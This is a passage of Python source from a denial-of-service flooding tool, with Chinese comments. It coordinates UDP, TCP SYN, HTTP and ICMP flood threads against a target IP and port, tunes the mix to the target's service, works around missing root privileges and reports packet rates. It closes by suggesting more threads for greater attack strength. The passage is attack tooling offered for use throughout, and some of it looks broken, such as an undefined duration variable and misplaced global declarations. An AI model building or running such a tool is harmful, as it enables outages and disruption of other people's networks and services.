            threads.append(t)
            t.start()
    
    elif attack_method == 'icmp':  # ICMP Flood
        # ICMP攻击通常需要较少的线程，因为每个包更大
        for i in range(min(threads_count, 100)):  # 限制ICMP线程数
            t = threading.Thread(target=icmp_flood, args=(ip, 0, i))
            t.daemon = True
            threads.append(t)
            t.start()
    
    elif attack_method == 'hybrid':  # 混合攻击
        # 使用增强版混合攻击函数
        mixed_attack(ip, port, threads_count)

# 混合攻击函数（增强版）
def mixed_attack(ip, port, thread_count):
    global threads, stop_attack
    
    # 智能线程分配算法
    def get_optimal_thread_allocation(total_threads):
        # 根据目标特性进行自适应线程分配
        allocations = {
            'UDP': 0.40,   # 默认40% UDP
            'TCP': 0.30,   # 默认30% TCP SYN
            'HTTP': 0.20,  # 默认20% HTTP
            'ICMP': 0.10   # 默认10% ICMP
        }
        
        # 动态调整策略
        if port in [80, 443, 8080, 8443]:
            # Web服务优化
            allocations['HTTP'] = 0.50
            allocations['UDP'] = 0.25
            allocations['TCP'] = 0.20
            allocations['ICMP'] = 0.05
        elif port in [22, 23, 25, 53]:
            # 标准服务优化
            allocations['UDP'] = 0.45
            allocations['TCP'] = 0.40
            allocations['HTTP'] = 0.10
            allocations['ICMP'] = 0.05
        elif total_threads > 100:
            # 高线程数优化
            allocations['UDP'] = 0.35
            allocations['TCP'] = 0.35
            allocations['HTTP'] = 0.20
            allocations['ICMP'] = 0.10
        elif total_threads < 10:
            # 低线程数优化
            allocations['UDP'] = 0.30
            allocations['TCP'] = 0.30
            allocations['HTTP'] = 0.30
            allocations['ICMP'] = 0.10
        
        # 计算具体线程数
        thread_counts = {}
        total_allocated = 0
        
        # 为UDP, TCP, HTTP分配线程
        for method in ['UDP', 'TCP', 'HTTP']:
            count = max(1, int(total_threads * allocations[method]))
            thread_counts[method] = count
            total_allocated += count
        
        # ICMP分配剩余线程，至少1个
        icmp_count = max(1, total_threads - total_allocated)
        thread_counts['ICMP'] = icmp_count
        
        # 重新平衡以确保总和正确
        total = sum(thread_counts.values())
        if total != total_threads:
            diff = total_threads - total
            thread_counts['UDP'] += diff
        
        return thread_counts
    
    # 获取最优线程分配
    thread_counts = get_optimal_thread_allocation(thread_count)
    
    print(f"\n[混合攻击] 启动中: 总计{thread_count}个线程")
    print(f"- UDP Flood: {thread_counts['UDP']}线程")
    print(f"- TCP SYN Flood: {thread_counts['TCP']}线程")
    print(f"- HTTP Flood: {thread_counts['HTTP']}线程")
    print(f"- ICMP Flood: {thread_counts['ICMP']}线程")
    print("\n[提示] 攻击模式已根据目标端口和线程数自动优化")
    
    # 线程启动函数
    def start_attack_threads(attack_func, count, method_name, ip, port):
        started = 0
        failed = 0
        
        for i in range(count):
            if stop_attack:
                break
                
            thread_id = f"{method_name}-{i+1}"
            try:
                t = threading.Thread(target=attack_func, args=(ip, port, thread_id))
                t.daemon = True
                threads.append(t)
                t.start()
                started += 1
                
                # 短暂延迟以避免同时创建过多线程
                time.sleep(random.uniform(0.001, 0.005))
            except Exception as e:
                failed += 1
                if hasattr(sys, 'argv') and '-v' in sys.argv:
                    print(f"[错误] 创建{method_name}线程失败: {e}")
        
        return started, failed
    
    # 按优先级启动攻击线程
    priorities = [
        ('UDP', udp_flood, thread_counts['UDP']),
        ('TCP', tcp_syn_flood, thread_counts['TCP']),
        ('HTTP', http_flood, thread_counts['HTTP'])
    ]
    
    for method_name, attack_func, count in priorities:
        if count > 0:
            print(f"\n[混合攻击] 启动{method_name}攻击线程 ({count})")
            started, failed = start_attack_threads(attack_func, count, method_name, ip, port)
            if started > 0 and hasattr(sys, 'argv') and '-v' in sys.argv:
                print(f"[混合攻击] {method_name}攻击: 成功启动{started}个线程")
    
    # 单独处理ICMP攻击（需要特殊权限）
    if thread_counts['ICMP'] > 0:
        print(f"\n[混合攻击] 准备启动ICMP攻击线程 ({thread_counts['ICMP']})")
        print("[注意] ICMP攻击需要管理员/root权限")
        
        # 先尝试启动一个ICMP线程以测试权限
        test_thread = threading.Thread(target=icmp_flood, args=(ip, port, "ICMP-Test"))
        test_thread.daemon = True
        threads.append(test_thread)
        test_thread.start()
        
        # 等待短暂时间查看是否有权限错误
        time.sleep(0.5)
        
        # 如果没有触发停止信号（权限错误会触发），则启动剩余ICMP线程
        if not stop_attack:
            started, failed = start_attack_threads(icmp_flood, 
                                                  thread_counts['ICMP'] - 1, 
                                                  "ICMP", 
                                                  ip, port)
            if started > 0 and hasattr(sys, 'argv') and '-v' in sys.argv:
                print(f"[混合攻击] ICMP攻击: 成功启动{started + 1}个线程")
        else:
            # 如果ICMP失败，重新分配线程到其他攻击方法
            print("[混合攻击] ICMP攻击需要管理员权限，重新分配线程到其他攻击方法")
            
            # 重置stop_attack标志以继续其他攻击
            stop_attack = False
            
            # 计算要重新分配的线程数
            reallocate = thread_counts['ICMP']
            
            # 按比例重新分配
            udp_add = max(1, int(reallocate * 0.5))
            tcp_add = max(1, int(reallocate * 0.3))
            http_add = reallocate - udp_add - tcp_add
            
            # 启动额外的线程
            if udp_add > 0:
                start_attack_threads(udp_flood, udp_add, "UDP-Extra", ip, port)
            if tcp_add > 0:
                start_attack_threads(tcp_syn_flood, tcp_add, "TCP-Extra", ip, port)
            if http_add > 0:
                start_attack_threads(http_flood, http_add, "HTTP-Extra", ip, port)
                
    # 攻击启动延迟，给所有线程足够时间初始化
    time.sleep(1)
    print("\n[混合攻击] 所有攻击线程已启动，混合攻击正在进行中...")
    print("[提示] 按 Ctrl+C 停止攻击")
    
    # 高级攻击统计和持续时间控制
    start_time = time.time()
    last_print_time = start_time
    last_sent_count = 0
    
    # 添加定时停止功能
    stop_time = None
    if duration > 0:
        stop_time = time.time() + duration
        print(f"\n[信息] 攻击将在 {duration} 秒后自动停止")
        print(f"[信息] 预计结束时间: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(stop_time))}")
    else:
        print("\n[信息] 按 Ctrl+C 手动停止攻击")
    
    # 启动统计监控线程
    def stats_monitor():
        nonlocal last_print_time, last_sent_count
        last_stat_time = start_time
        
        while not stop_attack:
            current_time = time.time()
            elapsed = current_time - start_time
            
            # 每5秒更新一次统计信息
            if current_time - last_print_time >= 5:
                with lock:
                    current_sent = total_sent
                    current_errors = error_count
                
                # 计算5秒内的发送速率
                interval_sent = current_sent - last_sent_count
                interval_rate = interval_sent / 5 if 5 > 0 else 0
                
                # 计算总体速率
                total_rate = current_sent / elapsed if elapsed > 0 else 0
                
                # 计算进度百分比（如果设置了持续时间）
                progress = "N/A" if not stop_time else f"{((current_time - start_time) / (stop_time - start_time) * 100):.1f}%"
                
                # 计算剩余时间
                remaining = "N/A" if not stop_time else f"{max(0, stop_time - current_time):.1f}秒"
                
                # 错误率
                error_rate = "0.0%" if current_sent == 0 else f"{(current_errors / (current_sent + current_errors) * 100):.1f}%"
                
                # 清除当前行并显示新的统计信息
                sys.stdout.write("\r")
                sys.stdout.write(" " * 120)  # 清除整行
                sys.stdout.write("\r")
                
                # 彩色输出统计信息（在支持的终端）
                if hasattr(sys, 'argv') and '-v' not in sys.argv:
                    # 简洁模式
                    sys.stdout.write(f"[统计] 已运行: {int(elapsed)}秒 | 发送: {current_sent:,} | 速度: {int(total_rate)}/秒 | 剩余: {remaining}")
                else:
                    # 详细模式
                    sys.stdout.write(f"[统计] 时间: {int(elapsed)}秒 ({progress}) | 总计: {current_sent:,} | 错误: {current_errors:,} ({error_rate}) | 平均速率: {int(total_rate)}/秒 | 当前速率: {int(interval_rate)}/秒 | 剩余: {remaining}")
                
                sys.stdout.flush()
                last_print_time = current_time
                last_sent_count = current_sent
            
            # 检查是否达到停止时间
            if stop_time and current_time >= stop_time:
                with lock:
                    global stop_attack
                    stop_attack = True
                print("\n\n[信息] 攻击时间已达到，正在停止攻击...")
                break
            
            # 短暂睡眠以减少CPU使用率
            time.sleep(1)
    
    monitor_thread = threading.Thread(target=stats_monitor)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # 显示实时统计信息（这里仅作为回退，主要功能已移至stats_monitor线程）
    try:
        while not stop_attack:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[用户中断] 正在停止攻击...")
        stop_attack = True
    
    # 等待所有线程完成
    try:
        while not stop_attack and any(t.is_alive() for t in threads):
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[用户中断] 正在停止攻击...")
        with lock:
            stop_attack = True
    
    # 等待所有线程终止
    active_threads = [t for t in threads if t.is_alive()]
    while active_threads:
        for t in active_threads:
            t.join(0.5)  # 给每个线程0.5秒的时间来清理
        active_threads = [t for t in threads if t.is_alive()]
    
    # 计算最终统计数据
    attack_duration = time.time() - start_time
    packets_per_second = total_sent / attack_duration if attack_duration > 0 else 0
    
    # 生成攻击摘要报告
    print("\n\n" + "="*50)
    print("          🚀 攻击完成摘要 🚀")
    print("="*50)
    print(f"  攻击目标:     {ip}:{port}")
    print(f"  攻击方法:     {attack_method.upper()} Flood")
    print(f"  线程数量:     {threads_count}")
    print(f"  攻击时长:     {attack_duration:.2f}秒 ({int(attack_duration // 60)}分{int(attack_duration % 60)}秒)")
    print(f"  发送数据包:   {total_sent:,}")
    print(f"  错误计数:     {error_count:,}")
    print(f"  平均速率:     {packets_per_second:.2f} 包/秒")
    print(f"  有效率:       {((total_sent / (total_sent + error_count)) * 100):.2f}%")
    print("="*50)
    
    # 基于攻击结果的分析
    if total_sent < 1000:
        print("\n[⚠️  注意] 发送的数据包数量较少，可能遇到以下问题:")
        print("  - 目标可能不可达或已阻止连接")
        print("  - 本地网络限制或防火墙阻止")
        print("  - 权限不足（特别是ICMP攻击）")
    elif packets_per_second < 100:
        print("\n[📊 分析] 攻击速率较低，可能受以下因素影响:")
        print("  - 网络带宽限制")
        print("  - 目标网络防护机制")
        print("  - 本地系统资源限制")
    else:
        print("\n[✅ 成功] 攻击执行完成，达到了良好的发送速率")
        print("  - 考虑增加线程数以获得更高的攻击强度")
        print("  - 尝试混合攻击以提高有效性")
    
    print("\n攻击已完全停止。")
    sys.exit(0)